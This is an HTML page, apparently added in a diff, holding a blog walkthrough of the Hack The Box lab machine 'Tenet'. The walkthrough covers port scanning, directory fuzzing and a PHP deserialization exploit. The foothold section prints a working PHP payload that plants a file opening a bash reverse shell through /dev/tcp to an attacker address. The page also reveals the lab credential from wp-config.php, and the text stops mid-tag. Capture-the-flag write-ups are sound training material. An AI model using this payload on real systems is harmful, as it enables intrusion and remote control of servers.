@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html ⚡>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+
+    <title>Tenet Walkthrough | HTB</title>
+
+    <meta name="description" content="This machine is rated as medium, but to get foothold I had to be stuck for one and half hour. The machine contains PHP Object Deserial..." />
+    <link rel="icon" href="../../favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="../index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    
+    <meta property="og:site_name" content="h4rithd.com" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Tenet Walkthrough | HTB" />
+    <meta property="og:description" content="This machine is rated as medium, but to get foothold I had to be stuck for one and half hour. The machine contains PHP Object Deserial..." />
+    <meta property="og:url" content="https://h4rithd.com/blog/tenet-walkthrough/" />
+    <meta property="og:image" content="https://h4rithd.com/blog/content/images/2021/06/tenet.jpg" />
+    <meta property="article:published_time" content="2021-06-11T19:00:00.000Z" />
+    <meta property="article:modified_time" content="2021-06-11T21:48:36.000Z" />
+    <meta property="article:tag" content="Retired Machines HTB" />
+    <meta property="article:tag" content="Tenet Walkthrough" />
+    <meta property="article:tag" content="h4rithd" />
+    <meta property="article:tag" content="Harith Dilshan" />
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ShapManasick/" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Tenet Walkthrough | HTB" />
+    <meta name="twitter:description" content="This machine is rated as medium, but to get foothold I had to be stuck for one and half hour. The machine contains PHP Object Deserial..." />
+    <meta name="twitter:url" content="https://h4rithd.com/blog/tenet-walkthrough/" />
+    <meta name="twitter:image" content="https://h4rithd.com/blog/content/images/2021/06/tenet.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Harith Dilshan" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Retired Machines HTB, Tenet Walkthrough, h4rithd, Harith Dilshan" />
+    <meta name="twitter:site" content="@h4rithd" />
+    <meta name="twitter:creator" content="@h4rithd" />
+    <meta property="og:image:width" content="1920" />
+    <meta property="og:image:height" content="1035" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "h4rithd.com",
+        "url": "https://h4rithd.com/blog/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://h4rithd.com/blog/content/images/2021/06/Logo.png",
+            "width": 60,
+            "height": 60
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Harith Dilshan",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://h4rithd.com/blog/content/images/2021/06/ProfilePic.jpg",
+            "width": 2000,
+            "height": 2000
+        },
+        "url": "https://h4rithd.com/blog/author/h4rithd/",
+        "sameAs": [
+            "https://h4rithd.com/",
+            "https://twitter.com/h4rithd"
+        ]
+    },
+    "headline": "Tenet Walkthrough | HTB",
+    "url": "https://h4rithd.com/blog/tenet-walkthrough/",
+    "datePublished": "2021-06-11T19:00:00.000Z",
+    "dateModified": "2021-06-11T21:48:36.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://h4rithd.com/blog/content/images/2021/06/tenet.jpg",
+        "width": 1920,
+        "height": 1035
+    },
+    "keywords": "Retired Machines HTB, Tenet Walkthrough, h4rithd, Harith Dilshan",
+    "description": "Tenet has been retired !!! Well, that part is little dramatic. 😉😉\n\n\n--------------------------------------------------------------------------------\n\nThis machine is rated as medium, but to get foothold I had to be stuck for one\nand half hour. The machine contains PHP Object Deserialization vulnerability and\nalso PrivEsc which is so simple if you can understand the shell codes. Hope you\nwill like it. 😊😊\n\nEnough talks, 🥱 Let’s Get It Started 🐱‍💻\n\n&gt; Disclaimers: No flags (user/root) are sho",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://h4rithd.com/blog/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 4.6" />
+    <link rel="alternate" type="application/rss+xml" title="h4rithd.com" href="../../rss/index.html" />
+
+    <style amp-custom>
+    *,
+    *::before,
+    *::after {
+        box-sizing: border-box;
+    }
+
+    html {
+        overflow-x: hidden;
+        overflow-y: scroll;
+        font-size: 62.5%;
+        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+    }
+
+    body {
+        min-height: 100vh;
+        margin: 0;
+        padding: 0;
+        color: #3a4145;
+        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
+        font-size: 1.7rem;
+        line-height: 1.55em;
+        font-weight: 400;
+        font-style: normal;
+        background: #fff;
+        scroll-behavior: smooth;
+        overflow-x: hidden;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+    }
+
+    p,
+    ul,
+    ol,
+    li,
+    dl,
+    dd,
+    hr,
+    pre,
+    form,
+    table,
+    video,
+    figure,
+    figcaption,
+    blockquote {
+        margin: 0;
+        padding: 0;
+    }
+
+    ul[class],
+    ol[class] {
+        padding: 0;
+        list-style: none;
+    }
+
+    img {
+        display: block;
+        max-width: 100%;
+    }
+
+    input,
+    button,
+    select,
+    textarea {
+        font: inherit;
+        -webkit-appearance: none;
+    }
+
+    fieldset {
+        margin: 0;
+        padding: 0;
+        border: 0;
+    }
+
+    label {
+        display: block;
+        font-size: 0.9em;
+        font-weight: 700;
+    }
+
+    hr {
+        position: relative;
+        display: block;
+        width: 100%;
+        height: 1px;
+        border: 0;
+        border-top: 1px solid currentcolor;
+        opacity: 0.1;
+    }
+
+    ::selection {
+        text-shadow: none;
+        background: #cbeafb;
+    }
+
+    mark {
+        background-color: #fdffb6;
+    }
+
+    small {
+        font-size: 80%;
+    }
+
+    sub,
+    sup {
+        position: relative;
+        font-size: 75%;
+        line-height: 0;
+        vertical-align: baseline;
+    }
+    sup {
+        top: -0.5em;
+    }
+    sub {
+        bottom: -0.25em;
+    }
+
+    ul li + li {
+        margin-top: 0.6em;
+    }
+
+    a {
+        color: var(--ghost-accent-color, #1292EE);
+        text-decoration-skip-ink: auto;
+    }
+
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+        margin: 0;
+        font-weight: 700;
+        color: #121212;
+        line-height: 1.4em;
+    }
+
+    h1 {
+        font-size: 3.4rem;
+        line-height: 1.1em;
+    }
+
+    h2 {
+        font-size: 2.4rem;
+        line-height: 1.2em;
+    }
+
+    h3 {
+        font-size: 1.8rem;
+    }
+
+    h4 {
+        font-size: 1.7rem;
+    }
+
+    h5 {
+        font-size: 1.6rem;
+    }
+
+    h6 {
+        font-size: 1.6rem;
+    }
+
+    amp-img {
+        height: 100%;
+        width: 100%;
+        max-width: 100%;
+        max-height: 100%;
+    }
+
+    amp-img img {
+        object-fit: cover;
+    }
+
+    .page-header {
+        padding: 50px 5vmin 30px;
+        text-align: center;
+        font-size: 2rem;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+
+    .page-header a {
+        color: #121212;
+        font-weight: 700;
+        text-decoration: none;
+        font-size: 1.6rem;
+        letter-spacing: -0.1px;
+    }
+
+    .post {
+        max-width: 680px;
+        margin: 0 auto;
+    }
+
+    .post-header {
+        margin: 0 5vmin 5vmin;
+        text-align: center;
+    }
+
+    .post-meta {
+        margin: 1rem 0 0 0;
+        text-transform: uppercase;
+        color: #738a94;
+        font-weight: 500;
+        font-size: 1.3rem;
+    }
+
+    .post-image {
+        margin: 0 0 5vmin;
+    }
+
+    .post-image img {
+        display: block;
+        width: 100%;
+        height: auto;
+    }
+
+    .post-content {
+        padding: 0 5vmin;
+    }
+
+    .post-content > * + * {
+        margin-top: 1.5em;
+    }
+
+    .post-content [id]:not(:first-child) {
+        margin: 2em 0 0;
+    }
+
+    .post-content > [id] + * {
+        margin-top: 1rem;
+    }
+
+    .post-content [id] + .kg-card,
+    .post-content blockquote + .kg-card {
+        margin-top: 40px;
+    }
+
+    .post-content > ul,
+    .post-content > ol,
+    .post-content > dl {
+        padding-left: 1.9em;
+    }
+
+    .post-content hr {
+        margin-top: 40px;
+    }
+
+    .post .post-content hr + * {
+        margin-top: 40px;
+    }
+
+    .post-content amp-img {
+        background-color: #f8f8f8;
+    }
+
+    .post-content blockquote {
+        position: relative;
+        font-style: italic;
+    }
+
+    .post-content blockquote::before {
+        content: "";
+        position: absolute;
+        left: -1.5em;
+        top: 0;
+        bottom: 0;
+        width: 0.3rem;
+        background: var(--ghost-accent-color, #1292EE);
+    }
+
+    .post-content :not(.kg-card):not([id]) + .kg-card {
+        margin-top: 40px;
+    }
+
+    .post-content .kg-card + :not(.kg-card) {
+        margin-top: 40px;
+    }
+
+    .kg-card figcaption {
+        padding: 1.5rem 1.5rem 0;
+        text-align: center;
+        font-weight: 500;
+        font-size: 1.3rem;
+        line-height: 1.4em;
+        opacity: 0.6;
+    }
+
+    .kg-card figcaption strong {
+        color: rgba(0,0,0,0.8);
+    }
+
+    .post-content :not(pre) code {
+        vertical-align: middle;
+        padding: 0.15em 0.4em 0.15em;
+        border: #e1eaef 1px solid;
+        font-weight: 400;
+        font-size: 0.9em;
+        line-height: 1em;
+        color: #15171a;
+        background: #f0f6f9;
+        border-radius: 0.25em;
+    }
+
+    .post-content > pre {
+        overflow: scroll;
+        padding: 16px 20px;
+        color: #fff;
+        background: #1F2428;
+        border-radius: 5px;
+        box-shadow: 0 2px 6px -2px rgba(0,0,0,.1), 0 0 1px rgba(0,0,0,.4);
+    }
+
+    .kg-embed-card {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        width: 100%;
+    }
+
+    .kg-image-card img {
+        margin: auto;
+    }
+
+    .kg-gallery-card + .kg-gallery-card {
+        margin-top: 0.75em;
+    }
+
+    .kg-gallery-container {
+        position: relative;
+    }
+
+    .kg-gallery-row {
+        display: flex;
+        flex-direction: row;
+        justify-content: center;
+    }
+
+    .kg-gallery-image {
+        width: 100%;
+        height: 100%;
+    }
+
+    .kg-gallery-row:not(:first-of-type) {
+        margin: 0.75em 0 0 0;
+    }
+
+    .kg-gallery-image:not(:first-of-type) {
+        margin: 0 0 0 0.75em;
+    }
+
+    .kg-bookmark-card,
+    .kg-bookmark-publisher {
+        position: relative;
+    }
+
+    .kg-bookmark-container,
+    .kg-bookmark-container:hover {
+        display: flex;
+        flex-wrap: wrap;
+        flex-direction: row-reverse;
+        color: currentColor;
+        background: rgba(255,255,255,0.6);
+        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
+        text-decoration: none;
+        border-radius: 5px;
+        box-shadow: 0 2px 6px -2px rgba(0, 0, 0, 0.1), 0 0 1px rgba(0, 0, 0, 0.4);
+        overflow: hidden;
+    }
+
+    .kg-bookmark-content {
+        flex-basis: 0;
+        flex-grow: 999;
+        padding: 20px;
+        order: 1;
+    }
+
+    .kg-bookmark-title {
+        font-weight: 600;
+        font-size: 1.5rem;
+        line-height: 1.3em;
+    }
+
+    .kg-bookmark-description {
+        display: -webkit-box;
+        max-height: 45px;
+        margin: 0.5em 0 0 0;
+        font-size: 1.4rem;
+        line-height: 1.55em;
+        overflow: hidden;
+        opacity: 0.8;
+        -webkit-line-clamp: 2;
+        -webkit-box-orient: vertical;
+    }
+
+    .kg-bookmark-metadata {
+        margin-top: 20px;
+    }
+
+    .kg-bookmark-metadata {
+        display: flex;
+        align-items: center;
+        font-weight: 500;
+        font-size: 1.3rem;
+        line-height: 1.3em;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+
+    .kg-bookmark-description {
+        display: -webkit-box;
+        -webkit-box-orient: vertical;
+        -webkit-line-clamp: 2;
+        overflow: hidden;
+    }
+
+    .kg-bookmark-metadata amp-img {
+        width: 18px;
+        height: 18px;
+        max-width: 18px;
+        max-height: 18px;
+        margin-right: 10px;
+    }
+
+    .kg-bookmark-thumbnail {
+        display: flex;
+        flex-basis: 20rem;
+        flex-grow: 1;
+        justify-content: flex-end;
+    }
+
+    .kg-bookmark-thumbnail amp-img {
+        max-height: 200px;
+    }
+
+    .kg-bookmark-author {
+        white-space: nowrap;
+        text-overflow: ellipsis;
+        overflow: hidden;
+    }
+
+    .kg-bookmark-publisher::before {
+        content: "•";
+        margin: 0 .5em;
+    }
+
+    .kg-width-full.kg-card-hascaption {
+        display: grid;
+        grid-template-columns: inherit;
+    }
+
+    .post-content table {
+        border-collapse: collapse;
+        width: 100%;
+    }
+
+    .post-content th {
+        padding: 0.5em 0.8em;
+        text-align: left;
+        font-size: .75em;
+        text-transform: uppercase;
+    }
+
+    .post-content td {
+        padding: 0.4em 0.7em;
+    }
+
+    .post-content tbody tr:nth-child(2n + 1) {
+        background-color: rgba(0,0,0,0.1);
+        padding: 1px;
+    }
+
+    .post-content tbody tr:nth-child(2n + 2) td:last-child {
+        box-shadow:
+            inset 1px 0 rgba(0,0,0,0.1),
+            inset -1px 0 rgba(0,0,0,0.1);
+    }
+
+    .post-content tbody tr:nth-child(2n + 2) td {
+        box-shadow: inset 1px 0 rgba(0,0,0,0.1);
+    }
+
+    .post-content tbody tr:last-child {
+        border-bottom: 1px solid rgba(0,0,0,.1);
+    }
+
+    .page-footer {
+        padding: 60px 5vmin;
+        margin: 60px auto 0;
+        text-align: center;
+        background-color: #f8f8f8;
+    }
+
+    .page-footer h3 {
+        margin: 0.5rem 0 0 0;
+    }
+
+    .page-footer p {
+        max-width: 500px;
+        margin: 1rem auto 1.5rem;
+        font-size: 1.7rem;
+        line-height: 1.5em;
+        color: rgba(0,0,0,0.6)
+    }
+
+    .powered {
+        display: inline-flex;
+        align-items: center;
+        margin: 30px 0 0;
+        padding: 6px 9px 6px 6px;
+        border: rgba(0,0,0,0.1) 1px solid;
+        font-size: 12px;
+        line-height: 12px;
+        letter-spacing: -0.2px;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+        font-weight: 500;
+        color: #222;
+        text-decoration: none;
+        background: #fff;
+        border-radius: 6px;
+    }
+
+    .powered svg {
+        height: 16px;
+        width: 16px;
+        margin: 0 6px 0 0;
+    }
+
+    @media (max-width: 600px) {
+        body {
+            font-size: 1.6rem;
+        }
+        h1 {
+            font-size: 3rem;
+        }
+
+        h2 {
+            font-size: 2.2rem;
+        }
+    }
+
+    @media (max-width: 400px) {
+        h1 {
+            font-size: 2.6rem;
+            line-height: 1.15em;
+        }
+        h2 {
+            font-size: 2rem;
+            line-height: 1.2em;
+        }
+        h3 {
+            font-size: 1.7rem;
+        }
+    }
+
+    :root {--ghost-accent-color: #0065a3;}
+    </style>
+
+    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+
+    
+
+</head>
+
+<body class="amp-template">
+    <header class="page-header">
+        <a href="../../index.html">
+                <amp-img class="site-icon" src="https://h4rithd.com/blog/content/images/2021/06/favicon.ico" width="50" height="50" layout="fixed"></amp-img>
+        </a>
+    </header>
+
+    <main class="content" role="main">
+        <article class="post">
+
+            <header class="post-header">
+                <h1 class="post-title">Tenet Walkthrough</h1>
+                <section class="post-meta">
+                    Harith Dilshan -
+                    <time class="post-date" datetime="2021-06-12">12 Jun 2021</time>
+                </section>
+            </header>
+            <figure class="post-image">
+                <amp-img src="https://h4rithd.com/blog/content/images/2021/06/tenet.jpg" width="600" height="340" layout="responsive"></amp-img>
+            </figure>
+            <section class="post-content">
+
+                <p>Tenet has been retired !!! Well, that part is little dramatic. 😉😉</p><hr></hr><p>This machine is rated as medium, but to get foothold I had to be stuck for one and half hour. The machine contains PHP Object Deserialization vulnerability and also PrivEsc which is so simple if you can understand the shell codes. Hope you will like it. 😊😊</p><p>Enough talks, 🥱 Let’s Get It Started 🐱‍💻</p><blockquote><strong>Disclaimers: </strong>No flags (user/root) are shown in this writeup (as in usual writeups), so follow the procedure to grab the flags! 🐱‍👤</blockquote>
+<div class="elfsight-app-a4de7430-6c0c-44b8-aada-9b9ac759e396"></div><hr></hr><h2 id="01-enumeration">01 Enumeration</h2><p>First of all I will check the status of my VPN connection and whether the machine is alive or not. To do that we can simply ping to the IP address like this 👇👇</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-296.png" class="kg-image" alt width="1454" height="554" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-296.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-296.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-296.png 1454w" layout="responsive"></amp-img></figure><p>As you can see here, the <strong>TTL value is 63</strong>. That implies this machine is Linux.</p><p>As we did every time, let's begin with Nmap. For that I need to know which ports are open. So, run fast scan for all TCP ports.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.223 </code></pre><p>Here is the output 👇👇</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-297.png" class="kg-image" alt width="1654" height="1106" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-297.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-297.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-297.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-297.png 1654w" layout="responsive"></amp-img></figure><p>So, there are only two open ports. 🤔🤔</p><h3 id="011-run-nmap-scripting-engine">01.1 Run Nmap Scripting Engine</h3><p>To get the best result, we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore, we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 22,80 10.10.10.223</code></pre><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-298.png" class="kg-image" alt width="1934" height="922" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-298.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-298.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-298.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-298.png 1934w" layout="responsive"></amp-img></figure><p>By looking at the SSH service info, we can definitely say that the Operating System is <strong>Ubuntu </strong>and  <a href="https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.3" rel="noopener noreferrer">launchpad</a> information shows us the flavor is <strong>Bionic Beaver </strong>🐿🐿</p><p>So as usual, there is a webserver running on port 80. First, I will choose that port to go on further enumerations. Open whatever web browser you like and navigate to <em>http://10.10.10.223/</em></p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-299.png" class="kg-image" alt width="1717" height="911" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-299.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-299.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-299.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-299.png 1717w" layout="responsive"></amp-img></figure><p>You can see here that it is a default apache index page. Well, then we need brute force directories to identify if there are any other endpoints. I used to use <a href="https://github.com/maurosoria/dirsearch" rel="noopener noreferrer">dirsearch</a> tool before, but right now I'm using <a href="https://github.com/ffuf/ffuf" rel="noopener noreferrer">ffuf</a> tool because it has more power than other tools. In addition to doing directory brute force, we can also use this for credentials brute force and subdomain discovery.</p><p>Use following command for brute force directories. 👇👇</p><pre><code class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.223/FUZZ</code></pre><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-300.png" class="kg-image" alt width="2196" height="1214" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-300.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-300.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-300.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-300.png 2196w" layout="responsive"></amp-img></figure><p>And we found one valid endpoint called <code>wordpress</code> . Let's navigate to that endpoint.</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-301.png" class="kg-image" alt width="1519" height="665" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-301.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-301.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-301.png 1519w" layout="responsive"></amp-img></figure><p>This is what I got. Let's take a moment to look at the source code. Press <code>ctrl + u</code></p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-302.png" class="kg-image" alt width="1429" height="232" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-302.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-302.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-302.png 1429w" layout="responsive"></amp-img></figure><pre><code class="language-bash">echo -e "10.10.10.223\ttenet.htb" &gt;&gt; /etc/hosts</code></pre><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-303.png" class="kg-image" alt width="1108" height="332" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-303.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-303.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-303.png 1108w" layout="responsive"></amp-img></figure><p>And then navigate to the <strong>http://tenet.htb/</strong></p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-304.png" class="kg-image" alt width="1712" height="843" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-304.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-304.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-304.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-304.png 1712w" layout="responsive"></amp-img></figure><p>After doing some searching around the page, I found some interesting thing like this. 👇👇</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-305.png" class="kg-image" alt width="796" height="294" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-305.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-305.png 796w" layout="responsive"></amp-img></figure><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-306.png" class="kg-image" alt width="724" height="280" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-306.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-306.png 724w" layout="responsive"></amp-img></figure><p>With that point I had to get stuck for an hour and a half to find the next step.</p><p>Finally, here is another subdomain called <code>sator.tenet.htb</code> . Edit your host file again. 👇👇</p><pre><code class="language-bash">echo -e "10.10.10.223\tsator.tenet.htb" &gt;&gt; /etc/hosts</code></pre><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-307.png" class="kg-image" alt width="1456" height="370" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-307.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-307.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-307.png 1456w" layout="responsive"></amp-img></figure><p>Don't be lazy 🤓 now navigate to the <code>sator.tenet.htb</code></p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-308.png" class="kg-image" alt width="1710" height="800" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-308.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-308.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-308.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-308.png 1710w" layout="responsive"></amp-img></figure><p>Ah ha! 💡 I know how the game is like now based on Neil's comment which we met earlier. Therefore navigate again <code>http://sator.tenet.htb/sator.php</code></p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-309.png" class="kg-image" alt width="551" height="165" layout="responsive"></amp-img></figure><p>Neil is talking about the backup file. Okay then, let's check <code>sator.php.bak</code></p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-310.png" class="kg-image" alt width="906" height="529" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-310.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-310.png 906w" layout="responsive"></amp-img></figure><p>Yeah! 🙌 we have the backup file now. Let's download that file to our host machine and try to open that file.</p><pre><code class="language-bash">wget http://sator.tenet.htb/sator.php.bak</code></pre><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-311.png" class="kg-image" alt width="1940" height="662" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-311.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-311.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-311.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-311.png 1940w" layout="responsive"></amp-img></figure><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-312.png" class="kg-image" alt width="1782" height="1324" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-312.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-312.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-312.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-312.png 1782w" layout="responsive"></amp-img></figure><p>Damn it.😩 There is PHP deserialization vulnerability. In fact, I'm very weak when it comes PHP deserialization. Somehow, by analyzing the source code and using following articles, I was able to create the payload and it works.😁😁</p><ul><li><a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a" rel="noopener noreferrer">Exploiting PHP deserialization.</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Files/PHP-Serialization-RCE-Exploit.php" rel="noopener noreferrer">PHP Serialization RCE Exploit</a></li></ul><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-313.png" class="kg-image" alt width="600" height="283" srcset="https://h4rithd.com/blog/content/images/2021/06/image-313.png 600w" layout="responsive"></amp-img></figure><hr></hr><h2 id="02-foothold">02. Foothold</h2><p>The payload will look like this. 👇👇 Change <strong>YourIP</strong> as yours.</p><pre><code class="language-bash">&lt;?php
+
+class DatabaseExport {
+  public $user_file = 'h4rithd.php';
+  public $data = '&lt;?php exec("/bin/bash -c \'bash -i &gt; /dev/tcp/&lt;YourIP&gt;/4545 0&gt;&amp;1\'"); ?&gt;';
+  }
+
+$payload = 'http://sator.tenet.htb/sator.php?arepo='.urlencode(serialize(new DatabaseExport));
+
+system('curl '.$payload);
+system('curl http://sator.tenet.htb/h4rithd.php');
+
+?&gt;</code></pre><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-314.png" class="kg-image" alt width="1988" height="700" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-314.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-314.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-314.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-314.png 1988w" layout="responsive"></amp-img></figure><p>Now power up netcat listener and listen to port 4545. After that, we can run the above payload by typing <code>php payload.php</code> on the terminal. Then you will land on a reverse shell as user <code>www-data</code> 🤤🤤</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-315.png" class="kg-image" alt width="1509" height="270" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-315.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-315.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-315.png 1509w" layout="responsive"></amp-img></figure><p>OK! Now you will find a way to escalate the privilege's in order to read the user flag by doing some quick enumerations on wordpress directory.</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-316.png" class="kg-image" alt width="1600" height="442" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-316.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-316.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-316.png 1600w" layout="responsive"></amp-img></figure><p>In the <code>wp-config.php</code> file, disclose the credentials for user neil. <code>neil : Opera2112</code></p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-317.png" class="kg-image" alt width="1332" height="516" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-317.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-317.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-317.png 1332w" 